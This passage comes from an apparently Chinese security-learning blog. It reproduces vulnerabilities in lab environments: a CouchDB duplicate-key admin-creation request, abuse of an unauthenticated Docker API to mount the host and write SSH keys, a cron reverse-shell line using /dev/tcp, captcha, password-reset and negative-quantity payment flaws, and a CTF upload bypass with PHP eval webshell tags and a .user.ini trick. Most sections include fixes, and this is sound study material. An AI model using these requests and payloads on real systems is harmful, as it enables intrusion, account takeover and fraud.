Key. Returns &#123;value, Tuple&#125; if such a tuple is found, otherwise false.//在元组TupleList列表中搜索其第n个元素比较等于Key的元组。如果找到这样的元组，则返回&#123;value, Tuple&#125;，否则返回false。\n因此，我们可以绕过所有相关的输入验证并创建一个管理员用户：\ncurl -X PUT &#x27;http://your-ip:5984/_users/org.couchdb.user:oops&#x27;--data-binary &#x27;&#123;  &quot;type&quot;: &quot;user&quot;,  &quot;name&quot;: &quot;oops&quot;,  &quot;roles&quot;: [&quot;_admin&quot;],  &quot;roles&quot;: [],  &quot;password&quot;: &quot;password&quot;&#125;&#x27;\njs解析只存储第二个值，roles为空，权限放行；但Eralang解析器将解析并存储两个值，但是在CouchDB中get_value函数只返回了jiffy所解析到的第一个键的值，即admin，管理员权限。\n注：通过查看源码，权限判断中，只要roles长度大于0就返回forbidden，只有管理员才能进行修改。\n所以此POC成功绕过js的检查，并成功被erlang解析为管理员账户。\n进入实际环境中会发生如下身份验证过程：\nJavaScript在检测时，检测我们创建的用户“角色＝０”。无角色，也就不存在权限，所以没有危害，系统判定为安全，绕过了检测。接下来在CouchDB的Erlang部分实现身份验证和授权时，jiffy实现的时候，getter函数只返回第一个值也就是&quot;roles&quot;: [“_admin”],所以创建出了具有admin权限的账户。\n开始复现\n访问首页发现是json数据\n\n接下来访问http://127.0.0.1:5984/_utils/ 发现\n\n点击验证数据库正确性，发现我们不是管理员无权操作，这样的话我们尝试直接创建一个管理员用户\n\n接下来用的是网上的poc：用put发送一个请求创建管理员的数据包\nPUT /_users/org.couchdb.user:hybcx HTTP/1.1Host: 124.220.233.26:5984Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 108&#123;&quot;type&quot;: &quot;user&quot;,&quot;name&quot;: &quot;hybcx&quot;,&quot;roles&quot;: [&quot;_admin&quot;],&quot;password&quot;: &quot;hybcx&quot;&#125;\n先用bp抓个包，其实抓不抓都无所谓，我们也可以在终端上通过curl发送put数据包\n\n接下来在bp上，输入上述poc，如下图发现我们不是管理员，无权创建管理员账户\n\n但发送包含两个roles的数据包，即可绕过限制，创建一个管理员账户，这里创建了一个账户密码皆为hybcx的管理员账户，发送如下poc\nPUT /_users/org.couchdb.user:hybcx HTTP/1.1Host: 124.220.233.26:5984Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 108&#123;&quot;type&quot;: &quot;user&quot;,&quot;name&quot;: &quot;hybcx&quot;,&quot;roles&quot;: [&quot;_admin&quot;],&quot;roles&quot;: [],&quot;password&quot;: &quot;hybcx&quot;&#125;\n\n可以看到我们成功创建，登录验证一下\n\n也是成功登陆\n漏洞修复\npatch：加入了dedupe_keys字段用于对重复键的标识，重写了make_object方法，使得jiffy解析JSON的方法和JavaScript一致。\n结论：尽量不使用多个解析器处理相同的数据。如果项目使用多种语言，不可避免发生这种情况，应该确保解析器间没有功能差异，如这里JSON 解析标准就没有指定重复键的行为。\n参考文章：https://www.cnblogs.com/qweg/p/16574127.html\n3. 未经授权访问\n漏洞介绍：即游客能够访问普通用户甚至超级管理员才能访问的系统信息或者系统功能\n形成原因：主要是系统设计期间没有进行全局用户身份校验；或者校验存在缺陷\n漏洞点：在任何用户登录后才能访问的链接或者功能中都可能存在\n漏洞修复：\nJ2EE中存在filter，可以获取用户的cookie等信息\n修复思路：\n建立LoginList，值是当前在线用户的id\n对所有需要登录访问到URL，获取请求request\n再利用 getAttribute(“userid”) 获取其userid\n检查userid是否存在于LoginList中，不存在则直接返回错误跳转\n值得注意的是切勿将错误跳转写到Javascript里面，还返回目标URL页面的相关信息\nDocker daemon api未授权访问漏洞\n漏洞简介\nDocker Daemon把服务暴露在tcp的2375端口上，这样就可以在网络上操作Docker了。Docker本身没有身份认证的功能，只要网络上能访问到服务端口，就可以操作Docker。与上面的docker.sock文件利用类似。\n简单来说：该未授权访问漏洞是因为Docker API可以执行Docker命令，该接口是目的是取代Docker命令界面，通过URL操作Docker。\n环境搭建\n为了更贴近实战，所以不使用vulhub搭建docker，直接在宿主机上直接搭建。\n首先虚拟机创建一台linux（centos7版本）\n机器正常安装好docker\n接着进行文件备份（一下均是以root身份操作）\ncp /lib/systemd/system/docker.service /lib/systemd/system/docker.service.bak\n接着编辑\nvim /lib/systemd/system/docker.service\n把下面一段代码加入文件结尾\n[Service]ExecStart=ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock\n\n保存并退出编辑后，重载守护进程以及重启Docker：\nsystemctl daemon-reload`service docker restart\n通过执行命令查看是否开放了远程访问端口：\nsystemctl status docker.service\n\n如果本地搭建访问不了的话，很大原因是因为防火墙未放行2375端口，放行端口后就可以在其他机器访问到了\n如何在防火墙开启下，放行端口以至于外部可以访问添加firewall-cmd --zone=public --add-port=5005/tcp --permanent   （--permanent永久生效，没有此参数重启后失效）添加端口外部访问权限（这样外部才能访问）firewall-cmd --add-port=5005/tcp重新载入，添加端口后重新载入才能起作用firewall-cmd --reload这些之后，端口是开启成功的，如果没有成功，重启系统试试。\n漏洞检测+利用\n访问192.168.4.92:2375/version，若能访问，证明存在未授权访问漏洞。\n\n目标机：192.168.4.92\n攻击机：124.220.233.26\n写入密钥免密登陆\n在已经安装docker的vps上，使用-H参数连接目标主机的docker，使用images命令查询目标系统存在的镜像。\n\n使用docker命令创建一个容器，并将宿主机的磁盘挂载到容器中\ndocker -H tcp://192.168.4.92:2375 run -it -v /:/mnt a98b9e39cc6d /bin/bash\na98b9e39cc6d 是镜像的ID\n这条命令的意思是启动一个image ID 为a98b9e39cc6d的容器，并且将该宿主机的根目录挂在到容器的/mnt目录下\n\n如果目标机器上没有镜像就需要先pull一个镜像到目标机上。\ndocker -H tcp://192.168.4.92:2375 pull busybox\n这个镜像很小，方便下载。\n\n有镜像之后就很方便利用了。\ndocker -H tcp://192.168.4.92:2375 run -it -v /:/mnt 5242710cbd55 /bin/bashdocker -H tcp://192.168.4.92:2375 run -it --privileged busybox  bin/sh//换成sh的原因可能是，我这里用的finalshell的ssh连接的目标机docker -H tcp://192.168.4.92:2375 run -it -v /:/mnt 5242710cbd55 sh\n启动之后就会获得该容器宿主机的shell\n\n因为我们把主机的根目录挂在到了这个容器的/mnt容器下，所以我们可以直接往主机的/root/.ssh目录下写authorized_keys\n我们将攻击机的公钥写入authorized_keys\n\n这里我之前目标机与kali都没有公钥，产生公钥可以参考文章：Linux实现ssh免密\n成功免密登陆目标服务器\nssh root@192.168.4.92\n\n写入计划任务反弹shell\n因为docker 有远程连接命令，由于2375端口暴露，可未授权访问，所以现在可以在kali上通过远程方式连接doker\n前面的操作都一致\n唯一不同的就是写的命令和路径\n有很多种写计划任务的方法\ndocker -H tcp://192.168.4.92:2375 psdocker -H tcp://192.168.4.92:2375 images\n链接进去之后，发现没有镜像文件，那么去官方下载一个镜像文件busybox\ndocker -H tcp://192.168.241.142:2375 pull busybox\n接下来启动容器，并进入 busybox 容器\ndocker -H tcp://192.168.4.92:2375 imagesdocker -H tcp://192.168.4.92:2375 run -it --privileged busybox bin/sh#在kali中启动一个有交互的shell，并且是特权镜像#当操作者执行docker run —privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。\n进入容器后，使用fdisk -l命令查看磁盘文件\n注意：在特权模式下，逃逸的方式很多，比如：直接在容器内部挂载宿主机磁盘，然后切换根目录。\n\n从返回的type信息中可以判断出，/dev/sda2是主分区，那么接下里直接在容器内部挂载宿主机磁盘\n新建一个目录：mkdir wxiaoge挂载磁盘到新建目录：mount dev/sda2 wxiaoge进入目录：cd wxiaoge/新建文件：touch wxiaoge.txt\n接下来看一下靶机中确实创建了 wxiaoge.txt 文件，docker逃逸成功\n\n接下来可以反弹主机shell\n创建 wxiao.sh 文件\nvi wxiaoge.sh\n写入反弹 shell\n#!/bin/bash#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/binbash -c &quot;bash -i  &gt;&amp;/dev/tcp/192.168.4.92/55555 0&gt;&amp;1&quot;\n之后给 wxiao.sh 添加执行权限，并且写入到定时任务中\nchmod +x wxiao.sh echo &#x27;*/1 * * * *  /wxiao.sh&#x27; &gt;&gt; /wxiaoge/var/spool/cron/root#每分钟执行一次wxiaoge.sh 文件\nkali打开监听端口\n\n一分钟后成功返回 shell\n参考文章：https://www.modb.pro/db/152994\n漏洞修复：\n1.关闭2375端口 （尤其是公网情况下一定要禁用此端口）2.在防火墙上配置禁止外网访问2375端口\n2.5 图形验证码漏洞\n1. 图形验证码突破\n漏洞介绍：攻击者通过突破图形验证码的验证，可以实现如登录爆破、验证码绕过等攻击\n漏洞原理：\n图形验证码在错误后未失效\n返回验证码信息\n分步验证验证码\n漏洞点：任何存在图形验证码的功能中\n漏洞修复\n一旦验证码使用过了，必须要进行删除，重新生成验证码，可以梵高attribute中\n验证码需要设置超时，时间一到立即删除旧验证码，用户需要获取新的验证码\n验证码只需要返回图片，切勿将生成验证码的字符串也一并返回\n验证码不应该进行分布校验，应该连同请求数据一起发送到目标服务器进行校验，服务器校验通过则返回合法数据，否则返回错误\npikachu-on server\n测试结果：验证码有验证、无回显，但存在验证码固定（可重复使用）的设计缺陷。\n以下为验证码固定问题测试过程和源码分析。\n测试过程\n输入不正确的账户/密码及正确的验证码测试\n\n重复提交该数据包均只返回用户名或密码错误，说明存在验证码固定漏洞。\n\n所以我们可利用此漏洞绕过验证码直接对用户名和密码进行暴力破解。\n源码分析\n文件：\\vul\\burteforce\\bf_server.php\n关键代码：\n\n在用户名、密码和验证码均不为空的情况下判断输入验证码是否与生成后保存在session中的验证码相同，但比较完后没有删除该session[vcode],导致下一个数据包输入该验证码也会判断正确，出现验证码重复使用问题。\n凭借此漏洞，我们可以对用户名与密码进行爆破，验证码随意即可（但要保证该验证码是在校验页面出现过的验证码）\npikachu-on client\n测试过程\n通过查看源码发现前端JS判断验证码是否正确，所以先输入正确的验证码绕过前端判断。\n输入不正确的账户/密码及验证码进行抓包测试。\n\n由于已经绕过前端js对验证码的判断，可以将请求包中的验证码参数删除。（可以删除vcode参数）\n\n再将数据包发送到intruder对用户名和密码进行暴力破解即可。\n源码分析\n\n可以看到这里进行的前端js校验\n更多参考：https://xz.aliyun.com/t/6971#toc-20\n2.6 找回密码逻辑漏洞\n1. 密码找回漏洞\n漏洞介绍：攻击者通过密码找回逻辑漏洞，可以重置他人账号密码，危害他人账号安全\n漏洞原理：其实是验证码漏洞的一种：\n验证码时间长可爆破\n返回重置密码凭证\n若加密的重置密码凭证\n漏洞点：任何密码找回处（可延伸至相似具有验证功能） 修改接受校验码目标\n漏洞修复\n一旦验证码使用过了，必须要进行删除，重新生成验证码，可以放到attribute中\n验证码需要设置超时，时间一到立即删除旧验证码，用户需要获取新的验证码\n校验凭证不能够随着返回包进行返回\n验证码不应该进行分布校验，应该连同请求数据一起发送到目标服务器进行校验，服务器校验通过则返回合法数据，否则返回错误\n校验凭证的生成需要进行随机生成，防止凭证破解\n用户身份凭证和权限类漏洞修复一样，需要从attribute中获取\n登录密码重置漏洞-墨者学院\n靶场地址：https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe?spm=a2c6h.12873639.article-detail.4.6ee8b738CVQGTH\n打开靶场界面如下：\n\n1、通过“朝阳群众”的举报，证实手机号“17101304128”在系统平台从事非法集资、诈骗活动。\n2、请重置“17101304128”登录密码，以便登录获取完整的数字证据\n点击进入重置密码，来到密码重置界面\n\n已注册的手机号为18868345809\n先输入手机号17101304128，输入新密码：图形验证码，点击获取短信验证码\n\n提示：已发送至该手机，短信已发送有效期为5分钟\n再输入我已注册的手机号18868345809，设置新密码，验证码，获取验证码 得到验证码：Vxka6a\n\n\n漏洞点：他说短信已发送至该手机，可是这手机号也不是我的呀，我并不知道验证码是啥。此时就可以大胆的猜想一下，它这个网站的逻辑会不会出现问题，只是统一验证输入的验证码是否是正确的，而没有对绑定的手机号进行校验。我们可以使用刚才得到的验证码863bTV来尝试重置，成功得到key值。\n第二种做法：先用自身的账号进行密码重置流程，在得到验证码后，bp抓包修改手机号参数（换成目标手机号即可）这样同样可以的到key，两种想法都一样，只不过第二种似乎更好理解\n2.7 业务数据篡改漏洞\n1. 业务数据篡改（赋值反冲）\n漏洞介绍：攻击者通过进行数值篡改进行攻击，从而获利\n漏洞原理：\n没有对传输数据添加相关的校验参数\n后台未对参数值进行校验并直接使用数据包中的参数\n漏洞点：抽奖、购买、转账、返现等功能\n漏洞修复：\n对于软件来说，需要保护好内存数据，防止内存数据篡改\n计算传输数据的哈希，并将哈希附加在传输数据中作为校验值，避免被篡改\n先校验数值，防止大整数和负数；接着利用传输的商品ID从数据库中获取商品单价重新进行价格计算；最后生成订单（订单号应为随机值）\ndami__cms-0元支付漏洞\n\n直接小p一把梭，注册登录cms看到如上页面\n点击在线充值、我要提现，看到当前余额是0\n\n点击产品展示、大米测试产品\n\n点击立即购买\n\n填写完整送货地址，将付款方式修改为站内扣款\n\n点击提交订单，同时使用burp进行抓包操作\n将qty参数修改为-1，然后点击Forward，并取消抓包\n\n\n可以看到订单已经提交成功了\n此时查看提现页面的余额已经变为6000，也就是将订单中的-6000反加到了账户余额中\n利用0元支付漏洞，在网站商城进行购买操作时，可无需支付货币，对商城造成极大危害。\n应明确业务逻辑，防止出现此情况\n\n2.8 执行顺序逻辑漏洞\n1. 执行顺序篡改\n漏洞介绍：攻击者通过篡改分步逻辑中的步骤数字，达到绕过支付、校验等效果\n漏洞原理：程序逻辑分布进行，但是对步骤、验证信息、支付信息没有做好严格校验，导致修改步骤就直接绕过验证或者支付\n漏洞点：任何分布逻辑且带步骤数字，或者利用JS进行步骤控制的功能中\n漏洞修复\n在请求最后一步时候需要带入前面的验证信息，服务端再进行一次校验信息的验证，验证正确方能继续执行数据操作\n也可以及通过getAttributr(“userid”)获取userid进行userid和验证结果绑定，最后一步不带入验证信息，但是仍然要获取userid进行校验\n再最后一步通过验证之后或者服务器收到支付信息后再生成相应的数据交给用户\n2.9 其他类型逻辑漏洞\n1. 条件竞争漏洞\n漏洞介绍：可以通过同时重放大量数据包进行漏洞利用，通常用于突破限量、限额的问题都有奇效\n漏洞原理：由于目标函数中，判断与数据修复两个步骤之间，或者两个数据修改步骤之间存在时间差，且函数未进行同步锁定，则可以造成漏洞\n漏洞点：程序中存在限制，可以猜测到后台有判断与修改操作的方法\n漏洞修复\n修复思路：使用synchronized关键字，可以限制同一时间内访问方法的只有单一线程\n并不是每个条件竞争都必须修复\n2. 数据包重放漏洞\n漏洞介绍：通过数据包重放，可以造成短信轰炸、邮件轰炸、重复提交订单等\n漏洞原理：后台未进行相关操作的技术导致数据包重放\n漏洞点：短信验证码、邮件校验、提交订单等功能。\n修复方案：\n修复思路（针对短信、邮件）\n构造一个Hashmap&lt;String，short&gt;，存放邮箱或电话号码及对应次数\n只要某个邮箱或者电话号码次数够了，就不能继续发送了\n或者计算两次发送的时间间隔，时间过短就不继续发送了\n通用修复方案\n需要建立token机制或验证码机制，一次有效\n3. 参数绑定漏洞\n漏洞介绍：通过添加对象字段相关参数进行数据篡改\n漏洞原理：对象自动绑定被许多框架支持，它允许将HTTP请求参数自动的绑定到对象，开发者没有对其进行安全校验则容易导致数据篡改\n漏洞点：常见的所有输入的地方都会出现这个漏洞，特别是金融、用户、缓存等。\n漏洞修复：Spring MVC中可以使用@InitBinder注释，通过WebDataBinder的方法setAllowedFields、setDisallowedFields设置允许或不允许绑定的参数\n这里了解一下该漏洞产生原理吧\n软件框架有时允许开发人员自动将HTTP请求参数绑定到程序变量或对象中，以使开发人员更容易使用该框架开发。这有时会造成伤害。攻击者有时可以使用这种方法来创建，修改，更新开发人员或者业务本身从未打算设计到的参数，而这些新参数反过来又会影响程序代码中不需要的新变量或对象。\n因此就拿Spring MVC中的自动绑定作为举例，假设有一个用户提交基本信息的功能：\n首先看前端html：\n&lt;form action=“addUserInfo” method=&quot;post&quot;&gt;     &lt;input name=username type=text&gt;&lt;br&gt;     &lt;input name=phone type=text&gt;&lt;br&gt;     &lt;input name=email text=text&gt;&lt;br&gt;     &lt;input type=submit&gt;  &lt;/form&gt;\n很简单，一个form表单，通过post提交username，phone，email到addUserInfo。\n我们看一下用户的实体类：\npublic class User &#123;     private String userid;     private String username;     private String phone;     private String email;     private boolean isAdmin;     //Getters &amp; Setters   &#125;\n可以看到User的实体类存在除了username，phone，email还有比较重要的userid和isAdmin参数。\n我们接下来看一下controller层如果利用了自动绑定可以写出的处理方式：\n@RequestMapping(value = &quot;/addUserInfo&quot;, method = RequestMethod.POST)  public String submit(User user) &#123;     userService.add(user);     return &quot;successPage&quot;;  &#125;\n针对上述代码，给出GPT回答\n这段Java代码是一个简单的Spring MVC控制器方法，它处理HTTP POST请求并将用户信息保存到数据库中。让我们逐行来分析它：1. `@RequestMapping(value = &quot;/addUserInfo&quot;, method = RequestMethod.POST)`: 这是一个Spring MVC注解，用于将HTTP请求映射到控制器方法。在这里，它将HTTP POST请求映射到&quot;/addUserInfo&quot;路径，表示该方法将处理该路径的POST请求。2. `public String submit(User user) &#123;`: 这是控制器方法的声明，它接受一个名为&quot;User&quot;的参数。这里假设&quot;User&quot;是一个Java类，用于表示用户信息。3. `userService.add(user);`: 在这一行，代码调用一个名为&quot;userService&quot;的服务（Service）类的&quot;add&quot;方法，并传入&quot;user&quot;作为参数。这表示将用户信息保存到数据库中，可能是由&quot;userService&quot;处理数据持久化的操作。4. `return &quot;successPage&quot;;`: 最后，控制器方法返回一个字符串&quot;successPage&quot;。这通常用于将请求的处理结果返回给用户，告诉用户请求已成功处理。在这里，&quot;successPage&quot;可能是一个视图名称，它会被解析为一个实际的页面，展示给用户，用于确认操作已成功完成。总结：这段代码是一个用于处理HTTP POST请求的Spring MVC控制器方法。它接受一个&quot;user&quot;对象作为参数，将用户信息保存到数据库中，并返回一个名为&quot;successPage&quot;的字符串，用于告知用户操作已成功完成。具体的用户信息保存逻辑和&quot;successPage&quot;页面的展示取决于代码中其他部分，例如&quot;userService&quot;类和视图解析器的配置。\n潜在危害\n结合上面的demo，我们可以看到，controller层使用的自动绑定对象的方式，也就是使用了post请求的参数直接绑定到了User，虽然前端form表单中仅出现了username，phone，email，但是如果使用burp等工具向addUserInfo发送了\nPOST /addUserInfousername=daheike&amp;password=bypass&amp;email=test@test.com&amp;isAdmin=true\n或者\nPOST /addUserInfousername=daheike&amp;password=bypass&amp;email=test@test.com&amp;userid=adminid\n那么如果后续使用了被污染的对象的被污染的属性，那么就会产生一定的安全问题。\n自动绑定漏洞并非仅在Spring MVC中可能出现，只要有自动绑定功能的框架都可能出现这样的逻辑问题。\n但是可能对于大部分安全人员来说，可能面对的是一个黑盒的环境，很难发现controller层或者orm是否存在这样的问题，那么可能就需要多个表单的交叉对比，推测出可能出现问题的点了。\n修复建议\n通用修复方法是：避免将输入直接绑定到域对象，只有用户可以编辑的字段才包含在DTO中。以上文中的deom为例：\npublic class UserRegistrationFormDTO &#123;     private String username;     private String password;     private String email;     //Getters &amp; Setters   &#125;\n或者可以修改controller层，仅接收用户可以修改的参数：\n@RequestMapping(value = &quot;/addUserInfo&quot;, method = RequestMethod.POST)  public String submit(String username,String phone,String email) &#123;     userService.add(username,phone,email);     return &quot;successPage&quot;;  &#125;\n也可以设置白名单：\n@Controller  public class UserController  &#123;     @InitBinder     public void initBinder(WebDataBinder binder, WebRequest request)     &#123;        binder.setDisallowedFields([&quot;isAdmin&quot;]);     &#125;     ...  &#125;\n3.0 SRC中的逻辑漏洞总结\n1. 注册：    短信轰炸    验证码安全问题    密码爆破    邮箱轰炸2. 用户任意注册、批量注册3. 用户名枚举4. XSS（有框的地方就可以尝试插XSS）5. 登录：    短信轰炸、验证码安全问题、密码爆破、邮箱轰炸    SQL注入    撞库    抓包把password字段修改为空值发送    认证凭证替换、比如返回的数据包中包含账号，修改账号就能登录到其他账号    Cookie仿冒    修改返回包的相关数据，可能会登陆到其他的用户6. 找回密码：    短信邮箱轰炸、短信邮箱劫持    重置任意用户账户密码、验证码手机用户未统一验证    直接跳过验证步骤7. 购买支付、充值（要利用抓包去仔细查看每一个可用的参数）    交易金额、数量修改、更换支付模块（比如更换支付的模块金额）    交易信息订单编码/导致信息泄露    整数溢出，int最大值为2147483647，超过最大值    修改充值账户    支付绕过8. 抽奖活动\t刷奖品、积分\t并发9. 优惠卷、代金卷\t并发逻辑漏洞（burp批量获取优惠券）\t修改优惠券金额、数量10. 订单信息\t订单信息遍历、泄露\t订单信息泄露导致用户信息泄露\t删出他人订单11. 会员系统    修改个人信息上传文件，上传带弹窗的html    如遇上上传xlsx、docx，可能存在XXE，上传恶意的文档盲测    图片上传也可能遇到imagereagick命令执行，上传恶意图片    视频上传如果使用ffmpeg&lt;3.2.4（视频按帧分割成图片），上传恶意avi盲测ssrf    用户横向越权访问、遍历、导致用户信息泄露    SQL注入、个人简历处存储XSS个人信息注册的名称也可以插入XSS12. 传输过程\t明文传输账户密码\t修改信息处无session/token导致csrf\tPOST/COOKIE注入13. 评论\tPOST注入\t存储型XSS    无session/token导致CSRF1. 验证码问题\t万能验证码\t返回包中存在验证码\t删除验证码或者cookie中的值可以爆破账号密码2. \t短信轰炸    一直重放    删除修改cookie，重放数据包    遍历参数发送数据包    手机号后面加空格或者前面加其他的比如+86或者逗号分号等，然后重发数据包    请求参数修改大小写，或者添加请求参数比如&amp;id=1    一个站的登录处可能做了防护，但是再找回密码处可能没有安全防护，或者在注册流程中没有安全防护，所以说多测试接口    如果对手机号一天的次数进行了限制，还可以再发一次短信，DO intercept之后修改为成功回显3. 水平越权\t主要登陆后还是修改参数，主要找到多个接口不断测试\t关注网页源代码，有时候会有表单，但被bidden（隐藏标签）给隐藏起来了，可以修改返回包然后尝试获取数据检测\t多个账号，主要分析请求参数4. 数据泄露\t再找回密码处，填写数据后抓包查看返回信息，有可能存在敏感数据返回5. 任意用户密码重置\t目前大部分都是在修改密码处参数修改\t有些是前端验证\t\t支付逻辑漏洞1. 边界值问题 : 正常的逻辑是用户购买商品，然后价格累加得到一个总价进行扣款。这个时候就会产生逻辑问题：如果说用户购买的商品是负数了，那么计算的总数就是负数。反过来钱给用户2. 顺序执行缺陷：正常的逻辑是a-b-c-d 循环渐进的进行流程操作。这个时候就会产生逻辑问题：可以直接从中绕过某一个过程进入到下一步操作。如果说有一项是支付的操作，那么也就会产生支付绕过，如果说有一项是验证机制，就会绕过验证直接进入下一步。3. 金额直接传输导致篡改：直接对下单的金额进行修改值，这里可以使用fd或者burp抓包4. 确定支付之后还可以加入购物车：把商品放入购物车点击下单支付，会跳转到微信，支付宝等第三方支付平台。这个时候还可以继续在购物车中加入商品，支付结束之后，商家发放的商品是现在的购物车里面的东西。5. 请求重放：购买成功之后，继续重放请求，可以让购买的商品一直增加。购买成功之后，会有一个银行对商户网站跳转的过程，如果反复进行操作，有几率会导致商品反复购买和增加，但是不需要付更多的钱。6. 请求参数干扰：金钱做了签名认证之后，修改后不通过，但是在里面仍然会有一个参数对金额产生影响导致问题产生。7. 订单替换：订单替换发生在支付之后的事件处理，同时向服务器发起二次支付请求一个多一个少，支付金额少的，然后支付之后进行替换，告知服务器订单支付完成，并且过程可以反复的回放。8. 欺诈:需要两个收款人，一个是正常的商家，一个是伪造的商家9. 单位替换：产生在paypal类似的国际支付的场景。10. 用户替换：在支付过程中发生用户替换现象，首先登陆自己的账户，然后取得另外一个人的账户名等有效信息，在业务流程中用对方的用户名替换自己的用户名，用对方的余额购买完成后，再替换自己的账户名，这样就形成别人的钱买自己的东西11. 强制攻击：强制攻击发生在暴力破解的情况下，如果一个商家运用一个自己的网店，接入第三方支付接口，由于设计上的不当导致商家与第三方支付约定的密钥Key可以单独被MD5加密，导致可以使用MD5碰撞技术对密钥进行破解，攻击者可以设计简单的密钥加密信息使得MD5加密是可以用MD5碰撞技术进行暴力破解。12. 秘钥泄漏：内置支付功能的app为了设计上的方便有可能会把Md5或者是RSA的私钥泄漏导致攻击者反编译apk之后获取密钥信息使得交易信息可以被篡改。13. 函数修改：apk反编译之后的函数修改，可能导致商家在最后一步向支付方提交订单时未验证信息的准确性，仍然被篡改。14. heart bleed：SSL（安全套接层）协议是使用最为普遍网站加密技术，而OpenSSL则是开源的 SSL 套件，为全球成千上万的web服务器所使用。Web服务器正是通过它来将密钥发送给访客然后在双方的连接之间对信息进行加密。URL中使用 https打头的连接都采用了SSL加密技术。在线购物、网银等活动均采用SSL技术来防止窃密及避免中间人攻击。该漏洞被归为缓冲过度读取。缓冲过度读取错误是软件可以读取比应该被允许还多的数据。漏洞让特定版本的openSSL成为无需钥匙即可开启的“废锁”，入侵者每次可以翻检户主的64K信息，只要有足够的耐心和时间，就可以翻检足够多的数据，拼凑出户主的银行密码、私信等敏感数据。产生原因：数据在传输的两端是不加密的。一些数据如果在传输过程中不加密则会泄露个人数据等信息。1. 修改返回包的越权修改手机号一般的逻辑为：认证原手机号-&gt; 填写新手机号-&gt; 提交修改如果在下一步操作时，没有校验上一步的认证是否成功时，就会存在逻辑缺陷绕过比如在进行第一步认证原手机号时，随意输入验证码，将response包中的相关字段进行修改，比如0改成1，false改成true，即可绕过第一步验证，进入填写新手机号界面，如果第三步提交修改时没有验证第一步的结果，就会造成逻辑漏洞2. 登录绕过部分网站的身份验证放在了前端，因此只需要将response包中的相关字段进行修改，比如0改成1，false改成true，就可以登录任意用户账号3. 水平越权遍历ID在一些请求中，GET和POST中有明显的ID数字参数（手机号、员工号、账单号、银行卡号、订单号等等），可以尝试进行遍历，如果程序没有对当前权限进行判断，就会存在水平越权问题4. ID替换如果程序对用户标识进行了hash或者加密，而无法破解用的什么方式的话，就无法通过遍历ID来获取其它用户的信息了，此时可以尝试注册两个账号，通过替换两个ID加密后的值，判断程序是否对权限进行了验证，如果没有，也会存在越权问题5. 垂直越权观察cookie中的session字段，可能某些字段或者参数代表身份，尝试修改  \n","categories":["常见top漏洞"]},{"title":"攻防世界-easyupload","url":"/2023/08/02/easyupload/","content":"题目描述：\n一名合格的黑客眼中，所有的上传点都是开发者留下的后门\n题目解题：\n这题解释长知识了（还是太菜~）\n首先毕竟是新手题目，于是自己摸索了一会儿，首先就是上传shell.php发现失败，猜测肯定是过滤了php后缀啥的，暂不考虑后缀名绕过了，这有点太小儿科了，随后bp抓包修改了php后缀发现仍然没用，那肯定就是会检测文件内容的，之后尝试了一个很正常的jpg图片，成功上传，这提示我们文件类型也得正确（这也是后续要绕过的），之后尝试了图片马，依旧错误，更加确定会检测文件内容。之后尝试特殊的文件如.htaccess文件与.usr.ini文件，前者上传失败，而后者返回如下图的信息\n\n这表明这个路线有说法，这里信息告诉我们文件类型有问题，当时只是觉得修改type类型即可，但还是会失败，然后我就知识盲区了，随后看了wp，发现这道题会检测文件头，文件头符合图片文件类型的才可以。\n开始解题\n参考wp发现：\n本题的主要考点为利用fastcgi的.user.ini特性进行任意命令执行\n这里需要绕过的点如下\n检查文件内容是否有php字符串检查后缀中是否有htaccess或ph      检查文件头部信息文件MIME类型\n对于第一点可以利用短标签绕过，例如\n这里补充一下知识：\nphp中最常见的标签为\n&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;\n不过在题目上传时可能会被waf过滤掉php关键字。根据查询结果，还有四种php的标签，分别是：\n① 仅在配置short_open_tag=on时可以使用，适合执行php语句；\n②即使配置short_open_tag=off时依然可以使用，相当于，适合输出php语句~\n上述二者的短标签都不必闭合（即?&gt;可以省略不写，也可以连接成功）~\n&lt;?  @eval($_POST['a']);?&gt;\n \n&lt;?= @eval($_POST['a']);?&gt;\n \n&lt;?  @eval($_POST['a']);\n \n&lt;?= @eval($_POST['a']);\n\n③&lt;% %&gt; 据说需要配置php.ini文件中asp_tags=on（php.ini默认状态下是关闭的），但该作者未在php.ini中找到该选项…\n④  php7及之后官方就已经不支持的写法\nphp短标签参考1：php中的短标签 太坑人了 - dongguol - 博客园 (cnblogs.com)\nphp短标签参考2：无字母数字webshell总结 - 先知社区 (aliyun.com)\n对于第二点可以通过上传.user.ini以及正常jpg文件来进行getshell,可以参考以下文章\nhttps://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html\n在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。\n这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。\n其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。\n第三点绕过方式即在文件头部添加一个图片的文件头，比如GIF89a\n图片马需要在.php文件前增加文件头，上传时偶尔需要配合burpsuite抓包修改content-type，常见图片搭配格式如下表所示：\n\n\n\n文件格式\nphp 文件头\ncontent-type\n\n\n\n\n.jpg .jpe .jpeg\nJPGGraphic File\nimage/jpeg\n\n\n.png\nPNG Image File\nimage/png\n\n\n.gif\nGIF 89A\nimage/gif\n\n\n\n若题目要求上传其他格式的文件，如doc、pdf、dwg等，可以参考下面的博文：\n图片马参考1：文件头_iqiqiya的博客-CSDN博客_gif文件头\n图片马参考2：Content-type_瀚忄的博客-CSDN博客\n第四点绕过方法即修改上传时的Content-Type\n因此最终的payload为：上传.user.ini，内容为\nGIF89a                  